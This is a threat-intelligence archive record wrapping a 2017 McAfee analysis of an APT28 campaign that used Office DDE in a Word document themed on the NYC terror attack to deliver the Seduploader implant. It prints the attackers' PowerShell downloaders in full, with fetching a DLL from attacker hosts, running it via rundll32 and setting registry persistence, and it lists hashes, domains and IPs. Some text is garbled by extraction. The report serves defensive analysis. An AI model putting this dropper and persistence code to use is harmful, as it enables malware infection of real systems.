{
    "id": "b7b38bf6-c9b4-4b6f-b93e-6b9d4e0426df",
    "created_at": "2022-10-25T16:48:23.420535Z",
    "updated_at": "2025-03-27T02:15:24.922681Z",
    "deleted_at": null,
    "sha1_hash": "1df3af6ed515b55238da5e596ff5b0aa4b6e3a82",
    "title": "Threat Group APT28 Slips Office Malware into Doc Citing NYC Terror Attack",
    "authors": "",
    "file_creation_date": "2017-11-08T15:05:24Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 121757,
    "plain_text": "# Threat Group APT28 Slips Office Malware� into Doc Citing NYC Terror Attack\n\n**[By Ryan Sherstobitoff and Michael Rea on Nov 07, 2017](https://securingtomorrow.mcafee.com/author/ryan-sherstobitoff/)**\n\n\n**During our monitoring of activities around the APT28 threat group, McAfee Advanced Threat Research analysts**\n**identified a malicious Word document that appears to leverage the Microsoft Office Dynamic Data Exchange (DDE)�**\n**technique that has been previously reported by Advanced Threat Research. This document likely marks the first�**\n**observed use of this technique by APT28. The use of DDE with PowerShell allows an attacker to execute arbitrary**\n**code on a victim’s system regardless whether macros are enabled. (McAfee product detection is covered in the**\n**Indicators of Compromise section at the end of the document.)**\n\n**APT28 has recently focused on using different themes. In this case it capitalized on the recent terrorist attack in**\n**New York City. The document itself is blank. Once opened, the document contacts a control server to drop the first�**\n\n**stage of the malware, Seduploader, onto a victim’s system.**\n\n**The domain involved in the distribution of Seduploader was created on October 19, 11 days prior to the creation of**\n**Seduploader.**\n\n**The document we examined for this post:**\n\n**Filename: IsisAttackInNewYork.docx**\n\n**Sha1: 1c6c700ceebfbe799e115582665105caa03c5c9e**\n**Creation date: 2017-10-27T22:23:00Z**\n\n**The document uses the recently detailed DDE technique found in Office products to invoke the command prompt�**\n\n**to invoke PowerShell, which runs two commands. The first:�**\n\n**C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe**\n\n**NoP sta NonI W Hidden $e=(New Object**\n\n\n-----\n\n**#.EXE**\n\n**The second PowerShell command is Base64 encoded and is found in the version of config.txt received from the�**\n\n**remote server. It decodes as follows:**\n\n**$W=New-Object System.Net.WebClient;**\n**$p=($Env:ALLUSERSPROFILE+”\\vms.dll”);**\n\n**[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};�**\n**$W.DownloadFile(“hxxp://netmediaresources[.]com/media/resource/vms.dll “,$p);**\n\n**if (Test-Path $p){**\n**$rd_p=$Env:SYSTEMROOT+”\\System32\\rundll32.exe”;**\n\n**$p_a=$p+”,#1″;**\n**$pr=Start-Process $rd_p -ArgumentList $p_a;**\n\n**$p_bat=($Env:ALLUSERSPROFILE+”\\vms.bat”);**\n\n**$text=’set inst_pck = “%ALLUSERSPROFILE%\\vms.dll”‘+”`r`n”+’if NOT exist %inst_pck % (exit)’+”`r`n”+’start**\n**rundll32.exe %inst_pck %,#1’**\n\n**[io.File]::WriteAllText($p_bat,$text)**\n\n**New-Item -Path ‘HKCU:\\Environment’ -Force | Out-Null;**\n**New-ItemProperty -Path ‘HKCU:\\Environment’ -Name ‘UserInitMprLogonScript’ -Value “$p_bat” -**\n**PropertyType String -Force | Out-Null;**\n**}**\n\n**The PowerShell scripts contact the following URL to download Seduploader:**\n\n**hxxp://netmediaresources[.]com/media/resource/vms.dll**\n\n**The Seduploader sample has the following artifacts:**\n\n**Filename: vms.dll**\n\n**Sha1: 4bc722a9b0492a50bd86a1341f02c74c0d773db7**\n**Compile date: 2017-10-31 20:11:10**\n**Control server: webviewres[.]net**\n\n**The document downloads a version of the Seduploader first-stage reconnaissance implant, which profiles�**\n**prospective victims, pulling basic host information from the infected system to the attackers. If the system is of**\n**interest, then the installation of X-Agent or Sedreco usually follows.**\n\n**We have observed APT28 using Seduploader as a first-stage payload for several years from various public�**\n**reporting. Based on structural code analysis of recent payloads observed in the campaign, we see they are**\n**identical to previous Seduploader samples employed by APT28.**\n\n**We identified the control server domain associated with this activity as webviewres[.]net, which is consistent with�**\n**past APT28 domain registration techniques that spoof legitimate-sounding infrastructure. This domain was**\n**registered on October 25, a few days before the payload and malicious documents were created. The domain was**\n\n**first active on October 29, just days before this version of Seduploader was compiled. The IP currently resolves to�**\n**185.216.35.26 and is hosted on the name servers ns1.njal.la and ns2.njal.la.**\n\n**Further McAfee research identified the following related sample:�**\n\n**Fil** **t dll**\n\n\n-----\n\n**Compile date: 2017-10-30 23:53:02**\n**Control server: satellitedeluxpanorama[.]com. (This domain uses the same name servers as above.)**\n\n**The preceding sample most likely belongs to the same campaign. Based on our analysis it uses the same**\n**techniques and payload. We can clearly establish that the campaign involving documents using DDE techniques**\n**began on October 25.**\n\n**The domain satellitedeluxpanorama[.]com, used by the implant secnt.dll, resolved to 89.34.111.160 as of**\n**November 5. The malicious document 68c2809560c7623d2307d8797691abf3eafe319a is responsible for dropping**\n\n**the Seduploader payload (secnt.dll). Its original file name was SaberGuardian2017.docx. This document was�**\n**created on October 27. The document is distributed from hxxp://sendmevideo[.]org/SaberGuardian2017.docx. The**\n**document calls sendmevideo[.]org/dh2025e/eh.dll to download Seduploader**\n**(ab354807e687993fbeb1b325eb6e4ab38d428a1e).**\n\n**The PowerShell command embedded in this document:**\n\n**$W=New-Object System.Net.WebClient;**\n\n**$p=($Env:ALLUSERSPROFILE+”\\mvdrt.dll”);**\n\n**[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};�**\n\n**$W.DownloadFile(“http://sendmevideo.org/dh2025e/eh.dll”,$p);**\n\n**if (Test-Path $p){**\n\n**$rd_p=$Env:SYSTEMROOT+”\\System32\\rundll32.exe”;**\n\n**$p_a=$p+”,#1″;**\n\n**$pr=Start-Process $rd_p -ArgumentList $p_a;**\n\n**$p_bat=($Env:ALLUSERSPROFILE+”\\mvdrt.bat”);**\n\n**$text=’set inst_pck = “%ALLUSERSPROFILE%\\mvdrt.dll”‘+”`r`n”+’if NOT exist %inst_pck % (exit)’+”`r`n”+’start**\n**rundll32.exe %inst_pck %,#1’**\n\n**[io.File]::WriteAllText($p_bat,$text)**\n\n**New-Item -Path ‘HKCU:\\Environment’ -Force | Out-Null;**\n\n**New-ItemProperty -Path ‘HKCU:\\Environment’ -Name ‘UserInitMprLogonScript’ -Value “$p_bat” -**\n**PropertyType String -Force | Out-Null;**\n\n**}**\n\n**The file vms.dll, 4bc722a9b0492a50bd86a1341f02c74c0d773db7, is 99% similar-to secnt.dll�**\n**ab354807e687993fbeb1b325eb6e4ab38d428a1e, indicating the code is almost identical and highly likely to be part**\n**of the same campaign. These two DLL implants are likely part of the same campaign. Furthermore, the sample**\n\n\n-----\n\n**[conference Cy Con U.S.](http://aci.cvent.com/events/2017-international-conference-on-cyber-conflict-cycon-u-s-/event-summary-004d598d31684f21ac82050a9000369f.aspx)**\n\n**The attack techniques in the two campaigns differ: The campaign spoofing the Cy Con U.S conference used�**\n**document files to execute a malicious VBA script; this campaign using the terrorist theme uses DDE within a�**\n**document file to execute PowerShell and fetches a remote payload from a distribution site. The payloads,�**\n**however, are identical for both campaigns.**\n\n### Conclusion\n\n**APT28 is a resourceful threat actor that not only capitalizes on recent events to trick potential victims into**\n**infections, but can also rapidly incorporate new exploitation techniques to increase its success. Given the publicity**\n**the Cy Con U.S campaign received in the press, it is possible APT28 actors moved away from using the VBA script**\n**employed in past actions and chose to incorporate the DDE technique to bypass network defenses. Finally, the use**\n**of recent domestic events and a prominent US military exercise focused on deterring Russian aggression highlight**\n**APT28’s ability and interest in exploiting geopolitical events for their operations.**\n\n### Indicators of Compromise\n\n**SHA1 Hashes**\n\n**ab354807e687993fbeb1b325eb6e4ab38d428a1e (vms.dll, Seduploader implant)**\n**4bc722a9b0492a50bd86a1341f02c74c0d773db7 (secnt.dll, Seduploader implant)**\n**1c6c700ceebfbe799e115582665105caa03c5c9e (IsisAttackInNewYork.docx)**\n\n**68c2809560c7623d2307d8797691abf3eafe319a (SaberGuardian.docx)**\n\n**Domains**\n\n**webviewres[.]net**\n**netmediaresources[.]com**\n\n**IPs**\n\n**185.216.35.26**\n**89.34.111.160**\n\n**McAfee coverage**\n\n**McAfee products detect this threat as RDN/Generic Downloader.x.**\n\n**[Previous Article](https://securingtomorrow.mcafee.com/consumer/family-safety/kids-glued-youtube-7-ways-keep-safe/)**\n\n**[Categories: McAfee Labs](https://securingtomorrow.mcafee.com/category/mcafee-labs/)**\n**[Tags:  computer security, cybersecurity, endpoint protection](https://securingtomorrow.mcafee.com/tag/computer-security/)**\n\n## L a a pl\n\n\n-----\n\n**Facebook Comments ()** **Comments (0)** **G+ Comments**\n\n## Leave a Comment\n\n**Comment**\n\n**Name *** **Email ***\n\n**Please enter an answer in digits:**\n\n**thirteen − 7 =**\n\n**Post CommentPost Comment**\n\n## Newsletter Sign Up\n\n**First Name**\n\n**Last name**\n\n**Email**\n\n\n**Post CommentPost Comment**\n\n\n**Subscribe**\n\n\n## McAfee on Twitter\n\n\n-----\n\n**[mcafee_labs](https://www.twitter.com/mcafee_labs)**\n\n**[Breaking: threat group #APT28 attempted to capitalize on the recent terrorist attack in NYC. What we](https://twitter.com/#search?q=APT28)**\n**[know so far. https://t.co/UPUc9YMo0x](https://t.co/UPUc9YMo0x)**\n\n**3 hours ago**\n**[Reply · Retweet · Favorite](https://twitter.com/intent/tweet?in_reply_to=927969370877386753)**\n\n\n**[mcafee_labs](https://www.twitter.com/mcafee_labs)**\n\n**[RT @fr0gger_: Our @McAfee_Labs Threat Report highlight the use of digitally signed #Malware as](https://twitter.com/fr0gger_)**\n**[evasion trick #UnprotectProject](https://twitter.com/#search?q=UnprotectProject)** **[https://t.co…](https://t.co)**\n\n**5 hours ago**\n**[Reply · Retweet · Favorite](https://twitter.com/intent/tweet?in_reply_to=927946253442232321)**\n\n\n**[mcafee_labs](https://www.twitter.com/mcafee_labs)**\n\n**[Our new decryption tool, Ransomware Recover Mr^2, will be available for free to the #security](https://twitter.com/#search?q=security)**\n\n**[community. Details.… https://t.co/4blhyfdl8p](https://t.co/4blhyfdl8p)**\n\n**17 hours ago**\n**[Reply · Retweet · Favorite](https://twitter.com/intent/tweet?in_reply_to=927761298347253760)**\n\n\n## Previous Article\n\n**© 2017 McAfee LLC**\n\n**Close Menu**\n\n**Search**\n\n**[Business](https://securingtomorrow.mcafee.com/category/business/)**\n**[Consumer](https://securingtomorrow.mcafee.com/category/consumer/)**\n\n**[Executive Perspectives](https://securingtomorrow.mcafee.com/category/executive-perspectives/)**\n**[McAfee Partners](https://securingtomorrow.mcafee.com/category/mcafee-partners/)**\n\n**[McAfee Labs](https://securingtomorrow.mcafee.com/category/mcafee-labs/)**\n\n\n-----\n\n**English**\n\n\n**Follow us**\n\n**[About](https://www.mcafee.com/us/about-us.aspx)**\n\n**Subscribe**\n\n**[Contact & Media Requests](https://www.mcafee.com/us/about/contact-us.aspx#ht=tab-publicrelations)**\n\n**[Privacy Policy](https://www.mcafee.com/common/privacy/english/index.htm)**\n\n**[Legal](https://www.mcafee.com/us/about/legal/legal-notices.aspx)**\n\n**© McAfee LLC**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2017/2017.11.07.APT28_Slips_Office_Malware/Threat_Group_APT28_Slips_Office_Malware.pdf"
    ],
    "report_names": [
        "Threat_Group_APT28_Slips_Office_Malware"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716503,
    "ts_updated_at": 1743041724,
    "ts_creation_date": 1510153524,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/1df3af6ed515b55238da5e596ff5b0aa4b6e3a82.pdf",
        "text": "https://archive.orkl.eu/1df3af6ed515b55238da5e596ff5b0aa4b6e3a82.txt",
        "img": "https://archive.orkl.eu/1df3af6ed515b55238da5e596ff5b0aa4b6e3a82.jpg"
    }
}